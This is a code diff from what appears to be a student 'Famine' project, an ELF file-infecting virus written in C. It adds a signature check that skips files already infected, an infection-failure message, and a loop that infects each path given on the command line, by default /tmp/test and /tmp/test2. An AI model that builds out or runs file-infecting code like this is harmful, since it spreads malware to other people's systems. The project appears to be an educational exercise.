@@ -6,11 +6,36 @@ int		error(char *str)
 	return (1);
 }
 
+int		check_copy(char *ptr, size_t size)
+{
+	for (int i = 0; i < size; ++i)
+	{
+		if (message[0] == ptr[i])
+		{
+			int j = 0;
+			int ms = strlen(message);
+			while (i < size && j < ms)
+			{
+				if (message[j] != ptr[i])
+					break;
+				++j;
+				++i;
+			}
+			if (j == ms)
+				return (1);
+		}
+	}
+	return (0);
+}
+
 int		processing(char *ptr, size_t size, char *path, int fd)
 {
 	unsigned int	magic_number;
 	unsigned int	elf_magic_number;
-
+	
+	message = "face a la patate, tout est possible #Famine (jucapik)";
+	if (check_copy(ptr, size))
+		return (error("File already infected - "));
 	magic_number = *(int *)ptr;
 	elf_magic_number = ELFMAG3 << 24 | ELFMAG2 << 16 | ELFMAG1 << 8 | ELFMAG0;
 	if (magic_number ==  elf_magic_number)
@@ -45,7 +70,10 @@ int		infect(char *path)
 		== MAP_FAILED)
 		return (error("mmap failed\n"));
 	if (processing(ptr, buf.st_size, path, fd))
-		return (error("processing failed\n"));
+	{
+		dprintf(2, RED"%s infection failed\n"RESET, path);
+		return (1);
+	}
 	if (munmap(ptr, buf.st_size) < 0)
 		return (error("munmap failed\n"));
 	if (close(fd) < 0)
@@ -55,9 +83,19 @@ int		infect(char *path)
 
 int		main(int ac, char **av)
 {
+	outputhandle(ac, av);
 	if (ac <= 1)
+	{
 		infect("/tmp/test");
+		infect("/tmp/test2");
+	}
 	else
-		infect(av[1]);
+	{
+		for (int i = 1; i < ac; ++i)
+		{
+			if (av[i][0] != '-')
+				infect(av[i]);
+		}
+	}
 	return (0);
 }
